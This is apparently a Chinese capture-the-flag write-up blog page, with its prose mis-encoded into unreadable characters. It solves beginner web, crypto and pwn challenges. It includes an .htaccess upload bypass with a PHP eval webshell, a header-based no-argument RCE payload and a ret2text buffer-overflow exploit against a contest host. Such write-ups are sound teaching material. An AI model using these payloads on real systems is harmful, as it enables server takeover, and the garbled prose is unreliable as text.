è¿™ä¸€ä½å·²ç»è·‘å‡ºæ¥äº†ï¼Œå¯ä»¥breakæ‰ç„¶åä¸‹ä¸€è½®å¾ªç¯è·‘ä¸‹ä¸€ä½æ•°æ®äº†</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># å¦‚æœå·²ç»è·‘åˆ°äº†å­—æ¯è¡¨æœ€åä¸€ä½éƒ½è¿˜æ²¡æœ‰è¿›åˆ°ä¸Šé¢çš„ifç„¶åbreakï¼Œè¯´æ˜è¿™è½®å¾ªç¯æ²¡è·‘å‡ºæ¥æ­£ç¡®ç»“æœï¼Œè¯´æ˜æ³¨å…¥å®Œæˆï¼ˆæˆ–è€…æ³¨å…¥payloadå†™çš„æœ‰é—®é¢˜æ³¨å…¥å¤±è´¥ï¼‰ï¼Œè„šæœ¬æ²¡å¿…è¦ç»§ç»­è·‘ä¸‹å»äº†</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># if ch == alphabet[-1]:</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  print(&quot;æ³¨å…¥å®Œæˆ&quot;)</span></span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="comment"># Â  Â  exit(0)</span></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010165429.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-Upload-again"><a href="#WEEK2-WEB-Upload-again" class="headerlink" title="WEEK2|WEB  Upload again!"></a>WEEK2|WEB  Upload again!</h5><p>ç™½åå•ï¼Œç›´æ¥ç©¿htaccess,åŒ…å«å³å¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;.htaccess&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;g&#x27;]);&lt;/script&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/xinshengsai/20231010212627.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-R-C-E"><a href="#WEEK2-WEB-R-C-E" class="headerlink" title="WEEK2|WEB  R!!C!!E!!"></a>WEEK2|WEB  R!!C!!E!!</h5><p>æ‰«æç›®å½•å¾—åˆ°gitæ³„éœ²ï¼Œè®¿é—®/.git/indexå¾—åˆ°æºç ï¼Œæ‰“å¼€ä¹±ç ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°bo0g1pop.php<br><img src="/images/xinshengsai/20231011093422.png" alt="image-20220126203415648"><br>è®¿é—®ä¸€ä¸‹ï¼Œæ— å‚æ•°rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span>Â (<span class="string">&#x27;;&#x27;</span>Â ===Â preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,Â <span class="string">&#x27;&#x27;</span>,Â <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))Â &#123;  </span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;  </span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);  </span><br><span class="line">Â Â Â Â &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤getallheaders,ç›´æ¥ç”¨è¿™ä¸ª<br>GET /bo0g1pop.php?star=print_r(getallheaders());<br>å…ˆè¾“å‡ºæ‰€æœ‰çš„header<br><img src="/images/xinshengsai/20231011105148.png" alt="image-20220126203415648"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</span><br><span class="line">current() -è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‘ä¸€ä¸‹ä¸Šé¢é‚£ä¸ªæŒ‡å‘æ•°ç»„çš„æ²¡æœ‰è¢«banï¼Œä½¿ç”¨next<br><img src="/images/xinshengsai/20231011105427.png" alt="image-20220126203415648"><br>ï¼Œå¯ä»¥çœ‹åˆ°è¾“å‡ºäº†uaï¼Œé‚£è°ƒç”¨è¿™ä¸ªuaï¼Œæ¶æ„ä¼ å‚å³å¯ï¼ŒæŠŠprintæ”¹æˆeval<br>/bo0g1pop.php?star=eval(next(getallheaders()));<br><img src="/images/xinshengsai/20231011105540.png" alt="image-20220126203415648"><br><img src="/images/xinshengsai/20231011105651.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-brainfuck"><a href="#WEEK1-CRYPTO-brainfuck" class="headerlink" title="WEEK1|CRYPTO brainfuck"></a>WEEK1|CRYPTO brainfuck</h5><p>éšæ³¢é€æµå³å¯<br><img src="/images/xinshengsai/20231010165600.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Caesarâ€™s-Secert"><a href="#WEEK1-CRYPTO-Caesarâ€™s-Secert" class="headerlink" title="WEEK1|CRYPTO Caesarâ€™s Secert"></a>WEEK1|CRYPTO Caesarâ€™s Secert</h5><p><img src="/images/xinshengsai/20231010165735.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Fence"><a href="#WEEK1-CRYPTO-Fence" class="headerlink" title="WEEK1|CRYPTO Fence"></a>WEEK1|CRYPTO Fence</h5><p><img src="/images/xinshengsai/20231010165811.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Vigenere"><a href="#WEEK1-CRYPTO-Vigenere" class="headerlink" title="WEEK1|CRYPTO VigenÃ¨re"></a>WEEK1|CRYPTO VigenÃ¨re</h5><p><code>https://www.guballa.de/vigenere-solver</code><br><img src="/images/xinshengsai/20231013160101.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyencoding"><a href="#WEEK1-CRYPTO-babyencoding" class="headerlink" title="WEEK1|CRYPTO babyencoding"></a>WEEK1|CRYPTO babyencoding</h5><p>base64<br><img src="/images/xinshengsai/20231013161304.png" alt="image-20220126203415648"><br>base32<br><img src="/images/xinshengsai/20231013161544.png" alt="image-20220126203415648"><br>uuencode<br><a href="http://www.atoolbox.net/Tool.php?Id=731">http://www.atoolbox.net/Tool.php?Id=731</a><br><img src="/images/xinshengsai/20231013161254.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-Small-d"><a href="#WEEK1-CRYPTO-Small-d" class="headerlink" title="WEEK1|CRYPTO  Small d"></a>WEEK1|CRYPTO  Small d</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>eå¾ˆå¤§ï¼Œç»´çº³æ”»å‡»<br><img src="/images/xinshengsai/20231013162824.png" alt="image-20220126203415648"></p><h5 id="WEEK1-CRYPTO-babyrsa"><a href="#WEEK1-CRYPTO-babyrsa" class="headerlink" title="WEEK1|CRYPTO babyrsa"></a>WEEK1|CRYPTO babyrsa</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime</span>(<span class="params">n</span>):</span></span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        res *= getPrime(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)  <span class="comment">#32ä½n</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†nè¿›è¡Œåˆ†è§£<br><img src="/images/xinshengsai/20231020100522.png" alt="image-20220126203415648"><br>æ ¹æ®ä»£ç å¾—åˆ°ï¼Œnæ˜¯15ä¸ªç´ æ•°ç›¸ä¹˜å¾—æ¥çš„ï¼Œé‚£ä¹ˆï¼Œfnå°±çš„æ‰€æœ‰ç´ æ•°-1ç„¶åç›¸ä¹˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> distutils.util <span class="keyword">import</span> run_2to3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2 Â  Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p=<span class="number">2217990919</span></span><br><span class="line"></span><br><span class="line">q=<span class="number">2338725373</span></span><br><span class="line"></span><br><span class="line">r3=<span class="number">2370292207</span></span><br><span class="line"></span><br><span class="line">r4=<span class="number">2463878387</span></span><br><span class="line"></span><br><span class="line">r5=<span class="number">2706073949</span></span><br><span class="line"></span><br><span class="line">r6=<span class="number">2794985117</span></span><br><span class="line"></span><br><span class="line">r7=<span class="number">2804303069</span></span><br><span class="line"></span><br><span class="line">r8=<span class="number">2923072267</span></span><br><span class="line"></span><br><span class="line">r9=<span class="number">2970591037</span></span><br><span class="line"></span><br><span class="line">r10=<span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">r11=<span class="number">3654864131</span></span><br><span class="line"></span><br><span class="line">r12=<span class="number">3831680819</span></span><br><span class="line"></span><br><span class="line">r13=<span class="number">3939901243</span></span><br><span class="line"></span><br><span class="line">r14=<span class="number">4093178561</span></span><br><span class="line"></span><br><span class="line">r15=<span class="number">4278428893</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = p*q*r3 *r4 *r5 *r6 *r7 *r8*r9*r10*r11*r12*r13*r14*r15</span><br><span class="line"></span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r3-<span class="number">1</span>)*(r4-<span class="number">1</span>)*(r5-<span class="number">1</span>)*(r6-<span class="number">1</span>)*(r7-<span class="number">1</span>)*(r8-<span class="number">1</span>)*(r9-<span class="number">1</span>)*(r10-<span class="number">1</span>)*(r11-<span class="number">1</span>)*(r12-<span class="number">1</span>)*(r13-<span class="number">1</span>)*(r14-<span class="number">1</span>)*(r15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> Â </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># invertæ˜¯æ±‚ä¹˜æ³•é€†å…ƒ Â  Â </span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,fn)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(d))</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c,<span class="built_in">int</span>(d),n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-babyxor"><a href="#WEEK1-CRYPTO-babyxor" class="headerlink" title="WEEK1|CRYPTO  babyxor"></a>WEEK1|CRYPTO  babyxor</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from secret import *</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment"># Â  Â  ciphertext.append(f ^ key)</span></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Â binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> s[<span class="number">0</span>]^j == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(j)</span><br><span class="line"><span class="comment">#å…ˆç”¨ç¬¬ä¸€ä¸ªe9äº¦æˆ–1-255ï¼Œå¾—å‡ºkeyï¼Œkeyä¸º143ï¼Œåœ¨æ‰€æœ‰çš„éƒ½äº¦æˆ–14</span></span><br><span class="line">s = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]^<span class="number">143</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">Â <span class="comment">#flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;Â </span></span><br></pre></td></tr></table></figure><h5 id="WEEK1-CRYPTO-Vigenere-1"><a href="#WEEK1-CRYPTO-Vigenere-1" class="headerlink" title="WEEK1|CRYPTO VigenÃ¨re"></a>WEEK1|CRYPTO VigenÃ¨re</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag import flag, key</span></span><br><span class="line"><span class="comment"># modulus = 256</span></span><br><span class="line"><span class="comment"># ciphertext = []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for f in flag:</span></span><br><span class="line"><span class="comment"># Â  Â  ciphertext.append((key[0]*f + key[1]) % modulus)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(bytes(ciphertext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line"></span><br><span class="line">s = binascii.unhexlify(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>) + j) % modulus ==s[<span class="number">0</span>] Â <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>) + j) % modulus ==s[<span class="number">1</span>] Â <span class="keyword">and</span> (i*<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + j) % modulus == s[<span class="number">2</span>] :</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(i,j)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">a,b = <span class="number">17</span>,<span class="number">23</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (a*k + b)%<span class="number">256</span> == s[i]:</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®æºç çŸ¥é“ï¼Œa*flag+b =cå­—ç¬¦ï¼Œé‚£ä¹ˆï¼Œè®¾ä¸ªæ–¹ç¨‹å³å¯ï¼Œè§£å‡ºæ¥åï¼Œå†å¸¦å›å»ï¼Œå³å¯ã€‚</p><h5 id="WEEK1-PWN-ret2text"><a href="#WEEK1-PWN-ret2text" class="headerlink" title="WEEK1|PWN  ret2text"></a>WEEK1|PWN  ret2text</h5><p>ïŒ› ï„• /pwn/xinshengsai â¯ checksec ret2text                    âœ˜ INT ï‰’ 1m 16s root@Bohemian ï€— 11:08:48<br>[<em>] Checking for new versions of pwntools<br>    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.8/update to â€˜everâ€™ (old way).<br>    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[</em>] A newer version of pwntools is available on pypi (4.8.0 â€“&gt; 4.11.0).<br>    Update with: $ pip install -U pwntools<br>[*] â€˜/pwn/xinshengsai/ret2textâ€™<br>    Arch:     amd64-64-little<br>    RELRO:    Full RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br>æ²¡æœ‰å¼€ä¿æŠ¤<br><img src="/images/xinshengsai/20231102112114.png" alt="image-20220126203415648"><br>æ‹–åˆ°idaæœ‰binbash,<br><img src="/images/xinshengsai/20231102112146.png" alt="image-20220126203415648"><br>æº¢å‡ºçš„è¯æ˜¯20+8<br>poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p= remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29481</span>)</span><br><span class="line">backdoor = <span class="number">0x401212</span></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil(&quot;Welcome!May I have your name?\n&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#p.sendline(&#x27;cat flag&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#p.recvline(keepends=True)</span></span><br><span class="line"><span class="comment">#s = p.recv(numb = 2048, timeout = 3)</span></span><br><span class="line"><span class="comment">#sp = p.recv(numb = 5048, timeout = 3)</span></span><br><span class="line"><span class="comment">#print(sp)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-PWN-Vigenere"><a href="#WEEK1-PWN-Vigenere" class="headerlink" title="WEEK1|PWN VigenÃ¨re"></a>WEEK1|PWN VigenÃ¨re</h5><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 